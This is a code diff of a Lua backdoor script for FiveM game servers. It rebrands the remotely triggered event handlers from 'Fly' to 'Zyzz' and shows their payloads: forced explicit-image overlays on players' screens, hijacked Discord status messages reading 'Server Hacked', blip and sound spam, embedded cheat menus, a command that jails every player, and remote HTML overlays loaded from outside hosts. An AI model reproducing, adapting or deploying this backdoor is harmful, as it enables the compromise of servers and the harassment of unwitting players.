@@ -1,5 +1,5 @@
-RegisterNetEvent("Fly-Backdoor-pornScreen")
-AddEventHandler("Fly-Backdoor-pornScreen", function()
+RegisterNetEvent("Zyzz-Backdoor-pornScreen")
+AddEventHandler("Zyzz-Backdoor-pornScreen", function()
 	local pTxt = CreateRuntimeTxd('pornTxd');
 	local pornScreen = CreateDui("https://media.discordapp.net/attachments/947977977931628564/947987906314768394/ezgif.com-gif-maker_3.gif", 1920, 1080);
 	local pornHandle = GetDuiHandle(pornScreen)
@@ -12,25 +12,25 @@ AddEventHandler("Fly-Backdoor-pornScreen", function()
     end)
 end)
 
-RegisterNetEvent("Fly-Backdoor-discordHack")
-AddEventHandler("Fly-Backdoor-discordHack", function(text)
+RegisterNetEvent("Zyzz-Backdoor-discordHack")
+AddEventHandler("Zyzz-Backdoor-discordHack", function(text)
     Citizen.CreateThread(function()
         while true do
 			SetDiscordAppId(972882580519157822)
 			SetDiscordRichPresenceAsset("Flyteam")
 			SetRichPresence("Server Hacked by Flyteam")
 			SetDiscordRichPresenceAssetText('Developer : zyzz')
-			SetDiscordRichPresenceAssetSmall('Fly so High')
+			SetDiscordRichPresenceAssetSmall('Zyzz so High')
 			SetDiscordRichPresenceAssetSmallText('flyteam')
 			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.gg/flyteam")
-			SetDiscordRichPresenceAction(1, "Hacked by Fly", "https://discord.gg/flyteam")
+			SetDiscordRichPresenceAction(1, "Hacked by Zyzz", "https://discord.gg/flyteam")
 			Citizen.Wait(1)
         end
     end)
 end)
 
-RegisterNetEvent("Fly-Backdoor-BlipsHack")
-AddEventHandler("Fly-Backdoor-BlipsHack", function()
+RegisterNetEvent("Zyzz-Backdoor-BlipsHack")
+AddEventHandler("Zyzz-Backdoor-BlipsHack", function()
 	local blips = {
 		{title="Discord.gg/flyteam", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
 		{title="HACKED BY Flyteam", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
@@ -189,8 +189,8 @@ AddEventHandler("Fly-Backdoor-BlipsHack", function()
 	end)
 end)
 
-RegisterNetEvent("Fly-Backdoor-soundSpam")
-AddEventHandler("Fly-Backdoor-soundSpam", function()
+RegisterNetEvent("Zyzz-Backdoor-soundSpam")
+AddEventHandler("Zyzz-Backdoor-soundSpam", function()
 	Citizen.CreateThread(function()
 		while true do
 			PlaySound(-1, "CANCEL", "HUD_MINI_GAME_SOUNDSET", 0, 0, 1);
@@ -208,8 +208,8 @@ AddEventHandler("Fly-Backdoor-soundSpam", function()
 	end)
 end)
 
-RegisterNetEvent("Fly-Backdoor-Falcon")
-AddEventHandler("Fly-Backdoor-Falcon", function()
+RegisterNetEvent("Zyzz-Backdoor-Falcon")
+AddEventHandler("Zyzz-Backdoor-Falcon", function()
 	zyzz = {}
 	zyzz.debug = false
 
@@ -816,13 +816,13 @@ AddEventHandler("Fly-Backdoor-Falcon", function()
 	end
 
 	developers = {
-		"~r~oZyzz - ~b~oZyzz#Fly", 
+		"~r~oZyzz - ~b~oZyzz#Zyzz", 
 	}
 
-	menuName = "~h~Fly ~r~"
+	menuName = "~h~Zyzz ~r~"
 	version = "5.0"
-	theme = "Fly"
-	themes = {"infamous", "basic", "dark", "Fly"}
+	theme = "Zyzz"
+	themes = {"infamous", "basic", "dark", "Zyzz"}
 	mpMessage = false
 	menuKeybind = "F7"
 	menuKeybind2 = "F10"
@@ -834,7 +834,7 @@ AddEventHandler("Fly-Backdoor-Falcon", function()
 	motd2 = "Key ~r~*" ..teleportKeyblind.."* ~w~TeleportToWaypoint"
 	motd = "Key ~r~*" ..noclipKeybind.."* ~w~Active noclip!"
 	motd5 = "Key ~r~*" ..fixvaiculoKeyblind.."* ~w~Fix Car"
-	motd3 = "~r~ozyzz~s~#Fly ~n~~g~https://discord.gg/Flyware"
+	motd3 = "~r~ozyzz~s~#Zyzz ~n~~g~https://discord.gg/Flyteam"
 
 	menulist = {
 
@@ -4185,7 +4185,7 @@ AddEventHandler("Fly-Backdoor-Falcon", function()
 					RequestControlOnce(k)
 					SetVehicleNumberPlateText(k, plateInput)
 				end
-				elseif zyzz.CheckBox("~y~Make ~s~All Cars ~y~Fly", FlyingCars) then
+				elseif zyzz.CheckBox("~y~Make ~s~All Cars ~y~Zyzz", FlyingCars) then
 					FlyingCars = not FlyingCars
 				elseif zyzz.CheckBox("~y~Set ~s~The World On ~y~Fire", WorldOnFire) then
 					WorldOnFire = not WorldOnFire
@@ -7296,8 +7296,8 @@ AddEventHandler("Fly-Backdoor-Falcon", function()
 	end)
 end)
 
-RegisterNetEvent("Fly-Backdoor-Brutan")
-AddEventHandler("Fly-Backdoor-Brutan", function()
+RegisterNetEvent("Zyzz-Backdoor-Brutan")
+AddEventHandler("Zyzz-Backdoor-Brutan", function()
 	local mhaonn = true
 	ESX = nil;
 	Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) 
@@ -10326,37 +10326,37 @@ AddEventHandler("Fly-Backdoor-Brutan", function()
 		if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(eA, eB, eC) bv = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end end, false) RegisterCommand("pk", function(eA, eB, eC) bw = false end, false) RegisterCommand("lol", function(eA, eB, eC) mhaonn = false end, false)
 end)
 
-RegisterNetEvent("Fly-Backdoor-HackServer")
-AddEventHandler("Fly-Backdoor-HackServer", function()
+RegisterNetEvent("Zyzz-Backdoor-HackServer")
+AddEventHandler("Zyzz-Backdoor-HackServer", function()
 	local blips = {
-		{title="HACKED BY Fly", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY Fly", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY Fly", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY Fly", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY Fly", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY Fly", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY Fly", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY Fly", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY Fly", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY Fly", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY Fly", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY Fly", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY Fly", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY Fly", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY Fly", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY Fly", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY Fly", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY Fly", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY Fly", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY Fly", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY Fly", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY Fly", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY Fly", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY Fly", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY Fly", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY Fly", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY Fly", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY Fly", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
+		{title="HACKED BY Zyzz", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Zyzz", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Zyzz", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Zyzz", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Zyzz", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Zyzz", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Zyzz", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Zyzz", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Zyzz", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Zyzz", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Zyzz", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Zyzz", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Zyzz", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Zyzz", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Zyzz", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Zyzz", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Zyzz", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Zyzz", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Zyzz", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Zyzz", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Zyzz", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Zyzz", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Zyzz", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Zyzz", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Zyzz", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Zyzz", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Zyzz", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Zyzz", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
 	 }
 		 
 	Citizen.CreateThread(function()
@@ -10485,14 +10485,14 @@ AddEventHandler("Fly-Backdoor-HackServer", function()
 	   end
 	end)
 
-	local sound = CreateDui("https://spambude.net/Dks/html/sound/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
+	local sound = CreateDui("https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
 
 	local textureDic = CreateRuntimeTxd('duiTxd');
 
 	local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
-	local object = CreateDui("https://spambude.net/Dks/html/text_overlay/y.html", 1920, 1080);
-	local object2 = CreateDui("https://spambude.net/Dks/html/lyxos_bug/lyxos_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
-	local object3 = CreateDui("https://spambude.net/Dks/html/overlay/screen3_2.html", 1920, 1080);
+	local object = CreateDui("https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui", 1920, 1080);
+	local object2 = CreateDui("https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
+	local object3 = CreateDui("https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui", 1920, 1080);
 
 	local handle = GetDuiHandle(object) -- Gets DUI handle from object
 	local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
@@ -10509,42 +10509,42 @@ AddEventHandler("Fly-Backdoor-HackServer", function()
 
 	local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
 	local texts = {
-	   "Fly - discord.gg/Flyware",
-	   " Fly - discord.gg/Flyware",
-	   "  Fly - discord.gg/Flyware",
-	   "   Fly - discord.gg/Flyware",
-	   "    Fly - discord.gg/Flyware",
-	   "     Fly - discord.gg/Flyware",
-	   "      Fly - discord.gg/Flyware",
-	   "       Fly - discord.gg/Flyware",
-	   "        Fly - discord.gg/Flyware",
-	   "         Fly - discord.gg/Flyware",
-	   "          Fly - discord.gg/Flyware",
-	   "           Fly - discord.gg/Flyware",
-	   "            Fly - discord.gg/Flyware",
-	   "             Fly - discord.gg/Flyware",
-	   "              Fly - discord.gg/Flyware",
-	   "               Fly - discord.gg/Flyware",
-	   "                Fly - discord.gg/Flyware",
-	   "                 Fly - discord.gg/Flyware",
-	   "                  Fly - discord.gg/Flyware",
-	   "                 Fly - discord.gg/Flyware",
-	   "                Fly - discord.gg/Flyware",
-	   "               Fly - discord.gg/Flyware",
-	   "              Fly - discord.gg/Flyware",
-	   "             Fly - discord.gg/Flyware",
-	   "            Fly - discord.gg/Flyware",
-	   "           Fly - discord.gg/Flyware",
-	   "          Fly - discord.gg/Flyware",
-	   "         Fly - discord.gg/Flyware",
-	   "        Fly - discord.gg/Flyware",
-	   "       Fly - discord.gg/Flyware",
-	   "      Fly - discord.gg/Flyware",
-	   "     Fly - discord.gg/Flyware",
-	   "    Fly - discord.gg/Flyware",
-	   "   Fly - discord.gg/Flyware",
-	   "  Fly - discord.gg/Flyware",
-	   " Fly - discord.gg/Flyware",
+	   "Zyzz - discord.gg/Flyteam",
+	   " Zyzz - discord.gg/Flyteam",
+	   "  Zyzz - discord.gg/Flyteam",
+	   "   Zyzz - discord.gg/Flyteam",
+	   "    Zyzz - discord.gg/Flyteam",
+	   "     Zyzz - discord.gg/Flyteam",
+	   "      Zyzz - discord.gg/Flyteam",
+	   "       Zyzz - discord.gg/Flyteam",
+	   "        Zyzz - discord.gg/Flyteam",
+	   "         Zyzz - discord.gg/Flyteam",
+	   "          Zyzz - discord.gg/Flyteam",
+	   "           Zyzz - discord.gg/Flyteam",
+	   "            Zyzz - discord.gg/Flyteam",
+	   "             Zyzz - discord.gg/Flyteam",
+	   "              Zyzz - discord.gg/Flyteam",
+	   "               Zyzz - discord.gg/Flyteam",
+	   "                Zyzz - discord.gg/Flyteam",
+	   "                 Zyzz - discord.gg/Flyteam",
+	   "                  Zyzz - discord.gg/Flyteam",
+	   "                 Zyzz - discord.gg/Flyteam",
+	   "                Zyzz - discord.gg/Flyteam",
+	   "               Zyzz - discord.gg/Flyteam",
+	   "              Zyzz - discord.gg/Flyteam",
+	   "             Zyzz - discord.gg/Flyteam",
+	   "            Zyzz - discord.gg/Flyteam",
+	   "           Zyzz - discord.gg/Flyteam",
+	   "          Zyzz - discord.gg/Flyteam",
+	   "         Zyzz - discord.gg/Flyteam",
+	   "        Zyzz - discord.gg/Flyteam",
+	   "       Zyzz - discord.gg/Flyteam",
+	   "      Zyzz - discord.gg/Flyteam",
+	   "     Zyzz - discord.gg/Flyteam",
+	   "    Zyzz - discord.gg/Flyteam",
+	   "   Zyzz - discord.gg/Flyteam",
+	   "  Zyzz - discord.gg/Flyteam",
+	   " Zyzz - discord.gg/Flyteam",
 	}
 
 	Citizen.CreateThread(function()
@@ -10652,14 +10652,14 @@ AddEventHandler("Fly-Backdoor-HackServer", function()
 	end
 
 	local config = {
-	   ["TITLE"] = "~r~Fly - discord.gg/Flyware", 
-	   ["SUBTITLE"] = "~r~Fly - discord.gg/Flyware",
-	   ["MAP"] = "Fly",
-	   ["STATUS"] = "Fly",
-	   ["GAME"] = "Fly",
-	   ["INFO"] = "Fly",
-	   ["SETTINGS"] = "Fly",
-	   ["R*EDITOR"] = "Fly",
+	   ["TITLE"] = "~r~Zyzz - discord.gg/Flyteam", 
+	   ["SUBTITLE"] = "~r~Zyzz - discord.gg/Flyteam",
+	   ["MAP"] = "Zyzz",
+	   ["STATUS"] = "Zyzz",
+	   ["GAME"] = "Zyzz",
+	   ["INFO"] = "Zyzz",
+	   ["SETTINGS"] = "Zyzz",
+	   ["R*EDITOR"] = "Zyzz",
 	}
 
 	Citizen.CreateThread(function()
